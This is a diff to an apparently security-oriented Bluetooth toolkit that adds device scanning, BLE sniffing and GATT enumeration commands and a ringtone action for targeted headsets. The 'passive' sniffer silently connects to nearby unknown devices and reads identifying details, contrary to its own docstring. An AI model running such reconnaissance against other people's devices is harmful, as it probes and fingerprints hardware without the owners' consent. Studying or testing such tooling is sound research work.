@@ -595,10 +595,11 @@ def parse_args():
     hfp_parser.add_argument(
         "--action",
         choices=["info", "answer", "reject", "hangup",
-                 "dial", "voice", "ring", "volume"],
+                 "dial", "voice", "ring", "volume", "sco-ring"],
         default="info",
         help="HFP action to perform: info (default), answer, reject, hangup, "
-             "dial (requires --number), voice, ring (AG only), volume (AG only)"
+             "dial (requires --number), voice, ring (AG only), volume (AG only), "
+             "sco-ring (AG only - establish SCO audio and play ringtone)"
     )
     hfp_parser.add_argument(
         "--number",
@@ -651,6 +652,78 @@ def parse_args():
         default=3,
         help="How many chunks should be written in one flash write. "
              "Experiments show 3 works best. Larger numbers might not be possible.",
+    )
+
+    # Scan subcommand - discover Bluetooth devices
+    scan_parser = subparsers.add_parser(
+        "scan",
+        help="Scan for Bluetooth devices (Classic and/or BLE)"
+    )
+    scan_parser.add_argument(
+        "--mode",
+        choices=["classic", "ble", "both"],
+        default="classic",
+        help="Scan mode: classic (BR/EDR), ble, or both (default: classic)"
+    )
+    scan_parser.add_argument(
+        "--timeout",
+        type=float,
+        default=10.0,
+        help="Scan duration in seconds (default: 10)"
+    )
+    scan_parser.add_argument(
+        "--extended",
+        action="store_true",
+        help="Use extended inquiry for more device info"
+    )
+
+    # Sniff subcommand - passive BLE listening
+    sniff_parser = subparsers.add_parser(
+        "sniff",
+        help="Passive BLE advertisement sniffing (like nRF Connect)"
+    )
+    sniff_parser.add_argument(
+        "--timeout",
+        type=float,
+        default=0,
+        help="Sniff duration in seconds (0 = continuous, Ctrl+C to stop)"
+    )
+    sniff_parser.add_argument(
+        "--filter",
+        type=str,
+        help="Filter by device name (substring match)"
+    )
+    sniff_parser.add_argument(
+        "--filter-addr",
+        type=str,
+        help="Filter by MAC address (prefix match)"
+    )
+    sniff_parser.add_argument(
+        "--show-raw",
+        action="store_true",
+        help="Show raw advertisement data bytes"
+    )
+    sniff_parser.add_argument(
+        "--show-uuids",
+        action="store_true",
+        help="Show advertised service UUIDs"
+    )
+    sniff_parser.add_argument(
+        "--active",
+        action="store_true",
+        help="Use active scanning (sends scan requests to get device names)"
+    )
+
+    # BLE Info subcommand - enumerate BLE device information
+    ble_info_parser = subparsers.add_parser(
+        "ble-info",
+        help="Enumerate BLE device information (connect and read GATT services)"
+    )
+    ble_info_parser.add_argument(
+        "--timeout",
+        type=float,
+        default=30.0,
+        help="Connection timeout in seconds (default: 30)"
     )
 
     return parser.parse_args()
@@ -1328,6 +1401,1138 @@ async def command_bdaddr(r: RACE, outfile: str):
         logging.info(formatted_address)
 
 
+async def command_scan(args: argparse.Namespace):
+    """Scan for nearby Bluetooth devices.
+
+    Scans for Bluetooth Classic (BR/EDR) and/or BLE devices.
+    Classic scan uses Extended Inquiry to get device names and class.
+    """
+    from bumble.device import Device, DeviceConfiguration
+    from bumble.transport import open_transport_or_link
+    from bumble.hci import Address, HCI_Write_Inquiry_Mode_Command
+
+    controller = args.controller or "usb:0"
+    mode = getattr(args, 'mode', 'classic')
+    timeout = getattr(args, 'timeout', 10.0)
+    use_extended = getattr(args, 'extended', False)
+
+    # Release Bluetooth controller
+    release_bluetooth_controller(controller)
+
+    logging.info("=" * 60)
+    logging.info("Bluetooth Device Scanner")
+    logging.info("=" * 60)
+    logging.info("")
+
+    devices_found: dict[str, dict] = {}
+
+    if mode in ("classic", "both"):
+        logging.info("Scanning for Bluetooth Classic (BR/EDR) devices...")
+        logging.info("  Duration: %.0f seconds", timeout)
+        logging.info(
+            "  Mode: %s", "Extended Inquiry" if use_extended else "Standard Inquiry")
+        logging.info("")
+        logging.info("NOTE: Standard inquiry only finds DISCOVERABLE devices.")
+        logging.info(
+            "To find non-discoverable devices, you need their address.")
+        logging.info("")
+
+        try:
+            t = await open_transport_or_link(controller)
+            config = DeviceConfiguration()
+            config.keystore = "JsonKeyStore"
+            config.address = Address.generate_static_address()
+            config.name = "BTScanner"
+            device = Device.from_config_with_hci(config, t.source, t.sink)
+            device.classic_enabled = True
+            await device.power_on()
+
+            # Enable Extended Inquiry Mode for more info
+            if use_extended:
+                try:
+                    # Mode 2 = Extended Inquiry Result with RSSI
+                    await device.send_command(
+                        HCI_Write_Inquiry_Mode_Command(inquiry_mode=2)
+                    )
+                    logging.debug("Extended Inquiry Mode enabled")
+                except Exception as e:
+                    logging.debug("Could not enable extended inquiry: %s", e)
+
+            def on_inquiry_result(address, class_of_device, data, rssi):
+                addr_str = str(address)
+
+                # Parse Class of Device
+                cod_major = (class_of_device >> 8) & 0x1F
+                cod_minor = (class_of_device >> 2) & 0x3F
+                major_classes = {
+                    0: "Miscellaneous",
+                    1: "Computer",
+                    2: "Phone",
+                    3: "LAN/Network",
+                    4: "Audio/Video",
+                    5: "Peripheral",
+                    6: "Imaging",
+                    7: "Wearable",
+                    8: "Toy",
+                    9: "Health",
+                    31: "Uncategorized",
+                }
+                major_str = major_classes.get(
+                    cod_major, f"Unknown({cod_major})")
+
+                # Get name from EIR data
+                name = data.get(0x09)  # Complete Local Name
+                if not name:
+                    name = data.get(0x08)  # Shortened Local Name
+                if name:
+                    if isinstance(name, bytes):
+                        name = name.decode("utf-8", errors="replace")
+                else:
+                    name = "(unknown)"
+
+                # Store device info
+                if addr_str not in devices_found:
+                    devices_found[addr_str] = {
+                        "name": name,
+                        "rssi": rssi,
+                        "class": major_str,
+                        "class_raw": class_of_device,
+                        "type": "Classic"
+                    }
+                    logging.info(
+                        "  Found: %s  %-20s  RSSI: %ddBm  Class: %s",
+                        addr_str, name[:20], rssi if rssi else 0, major_str
+                    )
+
+            device.on("inquiry_result", on_inquiry_result)
+
+            logging.info("-" * 60)
+            await device.start_discovery()
+            await asyncio.sleep(timeout)
+            await device.stop_discovery()
+            await t.close()
+            logging.info("-" * 60)
+
+        except Exception as e:
+            logging.error("Classic scan failed: %s", e)
+
+    if mode in ("ble", "both"):
+        logging.info("")
+        logging.info("Scanning for Bluetooth Low Energy (BLE) devices...")
+        logging.info("  Duration: %.0f seconds", timeout)
+        logging.info("")
+
+        try:
+            from bleak import BleakScanner
+
+            def on_ble_device(device, adv_data):
+                addr_str = device.address
+                name = device.name or adv_data.local_name or "(unknown)"
+                rssi = adv_data.rssi
+
+                if addr_str not in devices_found:
+                    devices_found[addr_str] = {
+                        "name": name,
+                        "rssi": rssi,
+                        "class": "BLE",
+                        "type": "BLE"
+                    }
+                    logging.info(
+                        "  Found: %s  %-20s  RSSI: %ddBm",
+                        addr_str, name[:20], rssi if rssi else 0
+                    )
+
+            scanner = BleakScanner(detection_callback=on_ble_device)
+            logging.info("-" * 60)
+            await scanner.start()
+            await asyncio.sleep(timeout)
+            await scanner.stop()
+            logging.info("-" * 60)
+
+        except ImportError:
+            logging.error("BLE scanning requires 'bleak' package")
+        except Exception as e:
+            logging.error("BLE scan failed: %s", e)
+
+    # Summary
+    logging.info("")
+    logging.info("=" * 60)
+    logging.info("SCAN RESULTS: %d devices found", len(devices_found))
+    logging.info("=" * 60)
+    logging.info("")
+
+    if devices_found:
+        # Sort by RSSI (strongest first)
+        sorted_devices = sorted(
+            devices_found.items(),
+            key=lambda x: x[1].get("rssi", -999) or -999,
+            reverse=True
+        )
+
+        logging.info("%-18s  %-22s  %-8s  %-12s",
+                     "ADDRESS", "NAME", "RSSI", "TYPE")
+        logging.info("-" * 65)
+        for addr, info in sorted_devices:
+            logging.info(
+                "%-18s  %-22s  %-8s  %-12s",
+                addr,
+                info["name"][:22],
+                f"{info['rssi']}dBm" if info.get('rssi') else "N/A",
+                info.get("class", info["type"])
+            )
+        logging.info("")
+        logging.info("To connect to a device, use:")
+        logging.info(
+            "  python race_toolkit.py --target-address <ADDRESS> <command>")
+    else:
+        logging.info("No devices found.")
+        logging.info("")
+        logging.info("Tips:")
+        logging.info("  - Make sure target devices are powered on")
+        logging.info("  - Classic devices must be in DISCOVERABLE mode")
+        logging.info("  - Try increasing --timeout")
+        logging.info(
+            "  - If you know the address, use --target-address directly")
+
+
+async def command_sniff(args: argparse.Namespace):
+    """Passive BLE advertisement sniffing with live table display.
+
+    This is TRULY passive - we only listen for BLE advertisements without
+    sending any packets. Similar to what nRF Connect app does.
+
+    Note: For Bluetooth Classic, passive sniffing requires specialized
+    hardware like Ubertooth One due to frequency hopping.
+    """
+    from bumble.device import Device, DeviceConfiguration
+    from bumble.transport import open_transport_or_link
+    from bumble.hci import (
+        Address,
+        HCI_LE_Set_Scan_Parameters_Command,
+        HCI_LE_Set_Scan_Enable_Command,
+    )
+    from bumble.core import AdvertisingData
+    import shutil
+
+    controller = args.controller or "usb:0"
+    timeout = getattr(args, 'timeout', 0)
+    name_filter = getattr(args, 'filter', None)
+    addr_filter = getattr(args, 'filter_addr', None)
+    show_raw = getattr(args, 'show_raw', False)
+    show_uuids = getattr(args, 'show_uuids', False)
+    active_scan = getattr(args, 'active', False)
+
+    # Release Bluetooth controller
+    release_bluetooth_controller(controller)
+
+    devices_seen: dict[str, dict] = {}
+    packet_count = [0]
+    start_time = [None]
+    running = [True]
+    device = None
+    t = None
+
+    # Manufacturer company IDs
+    COMPANIES = {
+        0x004C: "Apple",
+        0x0006: "Microsoft",
+        0x00E0: "Google",
+        0x0075: "Samsung",
+        0x054C: "Sony",
+        0x0310: "Xiaomi",
+        0x0157: "Huawei",
+        0x0171: "Amazon",
+        0x0087: "Garmin",
+        0x00D2: "Bose",
+        0x0092: "JBL",
+        0x0269: "Fitbit",
+        0x02FF: "GN Audio (Jabra)",
+    }
+
+    def get_signal_bars(rssi: int) -> str:
+        """Convert RSSI to signal strength bars."""
+        if rssi >= -50:
+            return "████"  # Excellent
+        elif rssi >= -60:
+            return "███░"  # Good
+        elif rssi >= -70:
+            return "██░░"  # Fair
+        elif rssi >= -80:
+            return "█░░░"  # Weak
+        else:
+            return "░░░░"  # Very weak
+
+    def get_manufacturer(data: AdvertisingData) -> str:
+        """Extract manufacturer from advertising data."""
+        mfr_data = data.get(AdvertisingData.MANUFACTURER_SPECIFIC_DATA)
+        if mfr_data and isinstance(mfr_data, bytes) and len(mfr_data) >= 2:
+            company_id = struct.unpack('<H', mfr_data[:2])[0]
+            return COMPANIES.get(company_id, "")
+        return ""
+
+    def clear_screen():
+        """Clear terminal screen."""
+        print("\033[2J\033[H", end="", flush=True)
+
+    def move_cursor(row: int, col: int = 1):
+        """Move cursor to position."""
+        print(f"\033[{row};{col}H", end="", flush=True)
+
+    def draw_table():
+        """Draw the device table."""
+        term_size = shutil.get_terminal_size((80, 24))
+        width = term_size.columns
+        height = term_size.lines
+
+        clear_screen()
+
+        # Header
+        elapsed = time.time() - start_time[0] if start_time[0] else 0
+        print("\033[1;36m" + "=" * width + "\033[0m")
+        title = "  BLE ACTIVE SNIFFER  " if active_scan else "  BLE PASSIVE SNIFFER  "
+        padding = (width - len(title)) // 2
+        print("\033[1;36m" + " " * padding + title + " " * padding + "\033[0m")
+        print("\033[1;36m" + "=" * width + "\033[0m")
+        print()
+
+        # Stats line
+        mode_str = "\033[1;33mACTIVE\033[0m" if active_scan else "\033[1;32mPASSIVE\033[0m"
+        stats = f"  Mode: {mode_str}  |  Devices: \033[1;33m{len(devices_seen)}\033[0m  |  Packets: \033[1;33m{packet_count[0]}\033[0m  |  Time: \033[1;33m{elapsed:.0f}s\033[0m"
+        print(stats)
+        print()
+
+        # Table header
+        header = f"  {'#':<4} {'ADDRESS':<20} {'SIGNAL':<6} {'RSSI':<10} {'NAME':<24} {'VENDOR':<16} {'PKTS':>6}"
+        print("\033[1;37;44m" + header.ljust(width) + "\033[0m")
+
+        # Sort devices by packet count (most active first)
+        sorted_devices = sorted(
+            devices_seen.items(),
+            key=lambda x: x[1].get("count", 0),
+            reverse=True
+        )
+
+        # Calculate how many rows we can show (minimum 10)
+        # At least 10 devices, more if terminal is tall
+        max_rows = max(10, height - 12)
+
+        # Display devices
+        for idx, (addr, info) in enumerate(sorted_devices[:max_rows], 1):
+            rssi = info.get("rssi", -99)
+            name = info.get("name", "(unknown)")[:24]
+            vendor = info.get("vendor", "")[:16]
+            pkts = info.get("count", 0)
+            bars = get_signal_bars(rssi)
+            last_seen = info.get("last_seen", 0)
+            age = time.time() - last_seen if last_seen else 999
+
+            # Color code by signal strength
+            if rssi >= -50:
+                color = "\033[1;32m"  # Green - excellent
+            elif rssi >= -60:
+                color = "\033[1;92m"  # Light green - good
+            elif rssi >= -70:
+                color = "\033[1;33m"  # Yellow - fair
+            elif rssi >= -80:
+                color = "\033[1;31m"  # Red - weak
+            else:
+                color = "\033[1;90m"  # Gray - very weak
+
+            # Dim if not seen recently
+            if age > 5:
+                color = "\033[2m"  # Dim
+
+            row = f"  {idx:<4} {addr:<20} {bars:<6} {rssi:>4}dBm   {name:<24} {vendor:<16} {pkts:>6}"
+            print(f"{color}{row}\033[0m")
+
+        # Fill remaining rows
+        for _ in range(max_rows - len(sorted_devices[:max_rows])):
+            print()
+
+        # Footer
+        print()
+        print("\033[1;36m" + "-" * width + "\033[0m")
+        print("  \033[1;33mPress Ctrl+C to stop and select a device\033[0m")
+        print("\033[1;36m" + "-" * width + "\033[0m")
+
+    def on_advertisement(advertisement):
+        """Handle incoming BLE advertisement."""
+        packet_count[0] += 1
+        if start_time[0] is None:
+            start_time[0] = time.time()
+
+        addr_str = str(advertisement.address)
+        rssi = advertisement.rssi
+
+        # Apply filters
+        if addr_filter and not addr_str.upper().startswith(addr_filter.upper()):
+            return
+
+        # Get name from advertisement data
+        name = None
+        vendor = ""
+        if advertisement.data:
+            name = advertisement.data.get(AdvertisingData.COMPLETE_LOCAL_NAME)
+            if not name:
+                name = advertisement.data.get(
+                    AdvertisingData.SHORTENED_LOCAL_NAME)
+            if name and isinstance(name, bytes):
+                name = name.decode('utf-8', errors='replace')
+            vendor = get_manufacturer(advertisement.data)
+
+        if name_filter:
+            if not name or name_filter.lower() not in name.lower():
+                return
+
+        # Update or add device
+        existing = devices_seen.get(addr_str, {})
+        devices_seen[addr_str] = {
+            "name": name or existing.get("name") or "(unknown)",
+            "rssi": rssi,
+            "vendor": vendor or existing.get("vendor", ""),
+            "last_seen": time.time(),
+            "count": existing.get("count", 0) + 1,
+            "raw_data": advertisement.data if show_raw else None,
+        }
+
+    try:
+        t = await open_transport_or_link(controller)
+        config = DeviceConfiguration()
+        config.keystore = "JsonKeyStore"
+        config.address = Address.generate_static_address()
+        config.name = "BLESniffer"
+        device = Device.from_config_with_hci(config, t.source, t.sink)
+        await device.power_on()
+
+        # Set scan parameters - PASSIVE (0) or ACTIVE (1)
+        # Active scanning sends SCAN_REQ to get SCAN_RSP with device names
+        # Passive scanning only listens, no transmissions
+        scan_type = 1 if active_scan else 0
+        await device.send_command(
+            HCI_LE_Set_Scan_Parameters_Command(
+                le_scan_type=scan_type,
+                le_scan_interval=0x0010,
+                le_scan_window=0x0010,
+                own_address_type=0,
+                scanning_filter_policy=0,
+            )
+        )
+
+        # Register advertisement handler
+        device.on('advertisement', on_advertisement)
+
+        # Enable scanning
+        await device.send_command(
+            HCI_LE_Set_Scan_Enable_Command(
+                le_scan_enable=1,
+                filter_duplicates=0,
+            )
+        )
+
+        start_time[0] = time.time()
+
+        # Enumeration state tracking
+        enum_in_progress = [False]
+
+        from bumble.device import Peer
+        from bumble.gatt import (
+            GATT_DEVICE_NAME_CHARACTERISTIC,
+            GATT_APPEARANCE_CHARACTERISTIC,
+            GATT_MANUFACTURER_NAME_STRING_CHARACTERISTIC,
+            GATT_MODEL_NUMBER_STRING_CHARACTERISTIC,
+        )
+
+        # Appearance values for device type identification
+        APPEARANCES = {
+            64: "Phone", 128: "Computer", 192: "Watch", 256: "Clock",
+            320: "Display", 384: "Remote", 640: "Media Player",
+            960: "HID", 961: "Keyboard", 962: "Mouse", 963: "Joystick",
+            964: "Gamepad", 1088: "Running Sensor", 1152: "Cycling",
+            2112: "Audio Sink", 2113: "Speaker", 2176: "Audio Source",
+            2240: "Wearable", 2241: "Wristwatch", 3136: "Pulse Oximeter",
+            3200: "Weight Scale", 5184: "Hearing Aid",
+        }
+
+        async def enumerate_one_device(addr_str: str):
+            """Try to enumerate a single device - runs in background."""
+            if addr_str not in devices_seen:
+                return
+
+            info = devices_seen[addr_str]
+            # Skip if already has a name
+            if info.get("name") and info["name"] != "(unknown)":
+                return
+
+            connection = None
+            try:
+                # Stop scanning temporarily to connect
+                await device.send_command(
+                    HCI_LE_Set_Scan_Enable_Command(
+                        le_scan_enable=0, filter_duplicates=0)
+                )
+
+                clean_addr = addr_str.replace("/P", "")
+                target = Address(clean_addr)
+
+                connection = await asyncio.wait_for(
+                    device.connect(target),
+                    timeout=3.0  # Short timeout
+                )
+
+                peer = Peer(connection)
+                try:
+                    await asyncio.wait_for(peer.discover_services(), timeout=3.0)
+                    await asyncio.wait_for(peer.discover_characteristics(), timeout=2.0)
+                except asyncio.TimeoutError:
+                    pass
+
+                info["services_count"] = len(peer.services)
+                info["connectable"] = True
+
+                # Determine device type from services
+                service_types = []
+                for service in peer.services:
+                    suuid = str(service.uuid).lower()
+                    if "1812" in suuid:
+                        service_types.append("HID")
+                    elif "180d" in suuid:
+                        service_types.append("Heart Rate")
+                    elif "180f" in suuid:
+                        service_types.append("Battery")
+                    elif "1108" in suuid or "110b" in suuid or "110a" in suuid:
+                        service_types.append("Audio")
+
+                # Read key characteristics
+                for service in peer.services:
+                    for char in service.characteristics:
+                        try:
+                            if char.uuid == GATT_DEVICE_NAME_CHARACTERISTIC:
+                                value = await asyncio.wait_for(peer.read_value(char), timeout=1.5)
+                                if value:
+                                    info["name"] = value.decode(
+                                        'utf-8', errors='replace')
+                            elif char.uuid == GATT_APPEARANCE_CHARACTERISTIC:
+                                value = await asyncio.wait_for(peer.read_value(char), timeout=1.5)
+                                if value and len(value) >= 2:
+                                    app_val = struct.unpack('<H', value[:2])[0]
+                                    info["appearance"] = APPEARANCES.get(
+                                        app_val, f"0x{app_val:04X}")
+                            elif char.uuid == GATT_MANUFACTURER_NAME_STRING_CHARACTERISTIC:
+                                value = await asyncio.wait_for(peer.read_value(char), timeout=1.5)
+                                if value:
+                                    info["vendor"] = value.decode(
+                                        'utf-8', errors='replace')
+                            elif char.uuid == GATT_MODEL_NUMBER_STRING_CHARACTERISTIC:
+                                value = await asyncio.wait_for(peer.read_value(char), timeout=1.5)
+                                if value:
+                                    info["model"] = value.decode(
+                                        'utf-8', errors='replace')
+                        except Exception:
+                            pass
+
+                if service_types:
+                    info["device_type"] = "/".join(set(service_types))
+
+            except asyncio.TimeoutError:
+                info["connectable"] = False
+            except Exception:
+                info["connectable"] = False
+            finally:
+                try:
+                    if connection:
+                        await connection.disconnect()
+                except Exception:
+                    pass
+                # Resume scanning
+                try:
+                    await device.send_command(
+                        HCI_LE_Set_Scan_Enable_Command(
+                            le_scan_enable=1, filter_duplicates=0)
+                    )
+                except Exception:
+                    pass
+                enum_in_progress[0] = False
+
+        async def maybe_enumerate_next():
+            """Start enumerating the next unknown device if not busy."""
+            if enum_in_progress[0]:
+                return
+
+            # Sort devices the same way as the table (by packet count, most active first)
+            # This ensures we enumerate devices at the top of the table first
+            sorted_for_enum = sorted(
+                devices_seen.items(),
+                key=lambda x: x[1].get("count", 0),
+                reverse=True
+            )
+
+            # Find the first unknown device that we haven't tried yet
+            for addr, info in sorted_for_enum:
+                if info.get("connectable") is None and (not info.get("name") or info["name"] == "(unknown)"):
+                    # Haven't tried this one yet and it's unknown
+                    rssi = info.get("rssi", -999)
+                    if rssi > -85:  # Only try devices with reasonable signal
+                        enum_in_progress[0] = True
+                        # Mark as tried (will update if successful)
+                        info["connectable"] = False
+                        asyncio.create_task(enumerate_one_device(addr))
+                        return
+
+        # Main loop - refresh display every second AND enumerate in background
+        if timeout > 0:
+            end_time = time.time() + timeout
+            while time.time() < end_time and running[0]:
+                draw_table()
+                await maybe_enumerate_next()
+                await asyncio.sleep(1)
+        else:
+            while running[0]:
+                draw_table()
+                await maybe_enumerate_next()
+                await asyncio.sleep(1)
+
+    except asyncio.CancelledError:
+        pass
+    except KeyboardInterrupt:
+        pass
+    except Exception as e:
+        logging.error("Sniffing failed: %s", e)
+        import traceback
+        traceback.print_exc()
+    finally:
+        running[0] = False
+        try:
+            if device:
+                await device.send_command(
+                    HCI_LE_Set_Scan_Enable_Command(
+                        le_scan_enable=0,
+                        filter_duplicates=0,
+                    )
+                )
+            # Close transport - enumeration already happened during scanning
+            if t:
+                await t.close()
+        except Exception:
+            pass
+
+    # Clear screen and show final results
+    clear_screen()
+    print("\n\033[1;36m" + "=" * 70 + "\033[0m")
+    print("\033[1;36m  SCAN COMPLETE\033[0m")
+    print("\033[1;36m" + "=" * 70 + "\033[0m\n")
+
+    elapsed = time.time() - start_time[0] if start_time[0] else 0
+    print(f"  Duration: {elapsed:.1f} seconds")
+    print(f"  Packets received: {packet_count[0]}")
+    print(f"  Unique devices: {len(devices_seen)}\n")
+
+    if not devices_seen:
+        print("  No devices found.\n")
+        return None
+
+    # Sort by connectable + name + RSSI for final display
+    def sort_key(item):
+        addr, info = item
+        has_name = 1 if info.get("name") and info["name"] != "(unknown)" else 0
+        connectable = 1 if info.get("connectable") else 0
+        rssi = info.get("rssi", -999)
+        return (connectable, has_name, rssi)
+
+    sorted_devices = sorted(devices_seen.items(), key=sort_key, reverse=True)
+
+    # Count enumeration results
+    connectable_count = sum(
+        1 for _, info in devices_seen.items() if info.get("connectable"))
+    named_count = sum(1 for _, info in devices_seen.items()
+                      if info.get("name") and info["name"] != "(unknown)")
+
+    print(
+        f"  \033[1;36mDevices discovered:\033[0m {len(devices_seen)} total, {named_count} named, {connectable_count} connectable\n")
+
+    # Display enriched selection table directly (no second enumeration phase)
+    print("\033[1;37;44m" +
+          f"  {'#':<3} {'ADDRESS':<18} {'RSSI':<7} {'NAME':<22} {'TYPE':<12} {'VENDOR':<15} {'SVCS':<4}" + "\033[0m")
+    print()
+
+    for idx, (addr, info) in enumerate(sorted_devices, 1):
+        rssi = info.get("rssi", -99)
+        name = info.get("name", "(unknown)")[:22]
+        vendor = info.get("vendor", "")[:15]
+        device_type = info.get("device_type", "")[:12]
+        services = info.get("services_count", 0)
+        connectable = info.get("connectable", False)
+
+        # Color based on connectivity and signal
+        if connectable:
+            if rssi >= -60:
+                color = "\033[1;32m"  # Green - connectable, strong
+            elif rssi >= -80:
+                color = "\033[1;33m"  # Yellow - connectable, medium
+            else:
+                color = "\033[0;33m"  # Dim yellow - connectable, weak
+        else:
+            color = "\033[1;90m"  # Gray - not connectable
+
+        # Connection indicator
+        conn_icon = "●" if connectable else "○"
+        svcs_str = str(services) if services > 0 else "-"
+
+        print(
+            f"{color}  {idx:<3} {conn_icon} {addr:<17} {rssi:>4}dBm {name:<22} {device_type:<12} {vendor:<15} {svcs_str:<4}\033[0m")
+
+    print()
+    print("\033[1;36m" + "-" * 90 + "\033[0m")
+    print(
+        "  \033[1;32m●\033[0m = Connectable    \033[1;90m○\033[0m = Not connectable/timed out")
+
+    # Device selection
+    try:
+        choice = input(
+            "\n  \033[1;33mEnter device number to select (or press Enter to skip): \033[0m")
+        if choice.strip():
+            try:
+                idx = int(choice.strip()) - 1
+                if 0 <= idx < len(sorted_devices):
+                    selected_addr, selected_info = sorted_devices[idx]
+                    name = selected_info.get('name', 'unknown')
+                    model = selected_info.get('model', '')
+                    vendor = selected_info.get('vendor', '')
+
+                    print(f"\n  \033[1;32mSelected: {selected_addr}\033[0m")
+                    if name and name != "(unknown)":
+                        print(f"  \033[1;37mName: {name}\033[0m")
+                    if model:
+                        print(f"  \033[1;37mModel: {model}\033[0m")
+                    if vendor:
+                        print(f"  \033[1;37mVendor: {vendor}\033[0m")
+                    print(
+                        f"\n  \033[1;37mYou can now use this address with other commands:\033[0m")
+                    print(
+                        f"  \033[1;36m  --target-address {selected_addr}\033[0m")
+                    print(
+                        f"  \033[1;36m  python race_toolkit.py -c usb:0 --target-address {selected_addr} ble-info\033[0m\n")
+                    return selected_addr
+                else:
+                    print(f"\n  \033[1;31mInvalid selection.\033[0m\n")
+            except ValueError:
+                print(f"\n  \033[1;31mInvalid input.\033[0m\n")
+    except (EOFError, KeyboardInterrupt):
+        print("\n")
+
+    return None
+
+
+async def command_ble_info(args: argparse.Namespace):
+    """Enumerate BLE device information by connecting and reading GATT services.
+
+    Connects to a BLE device and reads:
+    - Device Name and Appearance (Generic Access Profile)
+    - Manufacturer, Model, Serial, Firmware (Device Information Service)
+    - All available GATT services and characteristics
+    """
+    from bumble.device import Device, DeviceConfiguration, Peer
+    from bumble.transport import open_transport_or_link
+    from bumble.hci import Address
+    from bumble.gatt import (
+        GATT_GENERIC_ACCESS_SERVICE,
+        GATT_DEVICE_NAME_CHARACTERISTIC,
+        GATT_APPEARANCE_CHARACTERISTIC,
+        GATT_DEVICE_INFORMATION_SERVICE,
+        GATT_MANUFACTURER_NAME_STRING_CHARACTERISTIC,
+        GATT_MODEL_NUMBER_STRING_CHARACTERISTIC,
+        GATT_SERIAL_NUMBER_STRING_CHARACTERISTIC,
+        GATT_FIRMWARE_REVISION_STRING_CHARACTERISTIC,
+        GATT_HARDWARE_REVISION_STRING_CHARACTERISTIC,
+        GATT_SOFTWARE_REVISION_STRING_CHARACTERISTIC,
+    )
+    import shutil
+
+    controller = args.controller or "usb:0"
+    target_address = args.target_address
+    timeout = getattr(args, 'timeout', 30.0)
+
+    if not target_address:
+        logging.error(
+            "Target address required. Use --target-address or run 'sniff --active' first.")
+        return
+
+    # Release Bluetooth controller
+    release_bluetooth_controller(controller)
+
+    # Well-known service UUIDs for device type identification
+    SERVICE_TYPES = {
+        "0000180f-0000-1000-8000-00805f9b34fb": ("Battery Service", "🔋"),
+        "0000180a-0000-1000-8000-00805f9b34fb": ("Device Information", "ℹ️"),
+        "00001800-0000-1000-8000-00805f9b34fb": ("Generic Access", "📱"),
+        "00001801-0000-1000-8000-00805f9b34fb": ("Generic Attribute", "📋"),
+        "0000180d-0000-1000-8000-00805f9b34fb": ("Heart Rate", "❤️"),
+        "00001816-0000-1000-8000-00805f9b34fb": ("Cycling Speed/Cadence", "🚴"),
+        "00001818-0000-1000-8000-00805f9b34fb": ("Cycling Power", "⚡"),
+        "00001819-0000-1000-8000-00805f9b34fb": ("Location/Navigation", "📍"),
+        "0000181a-0000-1000-8000-00805f9b34fb": ("Environmental Sensing", "🌡️"),
+        "0000181c-0000-1000-8000-00805f9b34fb": ("User Data", "👤"),
+        "0000181d-0000-1000-8000-00805f9b34fb": ("Weight Scale", "⚖️"),
+        "0000181e-0000-1000-8000-00805f9b34fb": ("Bond Management", "🔗"),
+        "00001802-0000-1000-8000-00805f9b34fb": ("Immediate Alert", "🚨"),
+        "00001803-0000-1000-8000-00805f9b34fb": ("Link Loss", "📶"),
+        "00001804-0000-1000-8000-00805f9b34fb": ("Tx Power", "📡"),
+        "00001805-0000-1000-8000-00805f9b34fb": ("Current Time", "🕐"),
+        "00001806-0000-1000-8000-00805f9b34fb": ("Reference Time", "⏱️"),
+        "00001808-0000-1000-8000-00805f9b34fb": ("Glucose", "💉"),
+        "00001809-0000-1000-8000-00805f9b34fb": ("Health Thermometer", "🌡️"),
+        "0000110a-0000-1000-8000-00805f9b34fb": ("Audio Source", "🔊"),
+        "0000110b-0000-1000-8000-00805f9b34fb": ("Audio Sink", "🎧"),
+        "0000111e-0000-1000-8000-00805f9b34fb": ("Handsfree", "📞"),
+        "0000111f-0000-1000-8000-00805f9b34fb": ("Handsfree AG", "📞"),
+        "00001812-0000-1000-8000-00805f9b34fb": ("HID (Keyboard/Mouse)", "⌨️"),
+        "0000fe07-0000-1000-8000-00805f9b34fb": ("Apple Notification", "🍎"),
+        "89d3502b-0f36-433a-8ef4-c502ad55f8dc": ("Apple AirPods", "🎧"),
+        "9fa480e0-4967-4542-9390-d343dc5d04ae": ("Apple Nearby", "📱"),
+        "7905f431-b5ce-4e99-a40f-4b1e122d00d0": ("Apple Media", "🎵"),
+        "d0611e78-bbb4-4591-a5f8-487910ae4366": ("Apple HomeKit", "🏠"),
+    }
+
+    # Appearance values
+    APPEARANCES = {
+        0: "Unknown",
+        64: "Phone",
+        128: "Computer",
+        192: "Watch",
+        193: "Watch (Sports)",
+        256: "Clock",
+        320: "Display",
+        384: "Remote Control",
+        448: "Eye Glasses",
+        512: "Tag",
+        576: "Keyring",
+        640: "Media Player",
+        704: "Barcode Scanner",
+        768: "Thermometer",
+        832: "Heart Rate Sensor",
+        896: "Blood Pressure",
+        960: "HID",
+        961: "Keyboard",
+        962: "Mouse",
+        963: "Joystick",
+        964: "Gamepad",
+        965: "Digitizer Tablet",
+        966: "Card Reader",
+        967: "Digital Pen",
+        968: "Barcode Scanner (HID)",
+        1024: "Glucose Meter",
+        1088: "Running/Walking Sensor",
+        1152: "Cycling",
+        1216: "Control Device",
+        1280: "Network Device",
+        1344: "Sensor",
+        1408: "Light Fixtures",
+        1472: "Fan",
+        1536: "HVAC",
+        1600: "Air Conditioning",
+        1664: "Humidifier",
+        1728: "Heating",
+        1792: "Access Control",
+        1856: "Motorized Device",
+        1920: "Power Device",
+        1984: "Light Source",
+        2048: "Window Covering",
+        2112: "Audio Sink",
+        2113: "Standalone Speaker",
+        2114: "Soundbar",
+        2115: "Bookshelf Speaker",
+        2116: "Standmounted Speaker",
+        2117: "Speakerphone",
+        2176: "Audio Source",
+        2177: "Microphone",
+        2178: "Alarm",
+        2240: "Wearable",
+        2241: "Wristwatch",
+        2242: "Pager",
+        2243: "Jacket",
+        2244: "Helmet",
+        2245: "Glasses",
+        2304: "Generic Outdoor Sports",
+        2305: "Location Display",
+        2306: "Location/Navigation Display",
+        2307: "Location Pod",
+        2308: "Location/Navigation Pod",
+        3136: "Pulse Oximeter",
+        3200: "Weight Scale",
+        3264: "Personal Mobility Device",
+        3328: "Insulin Pen",
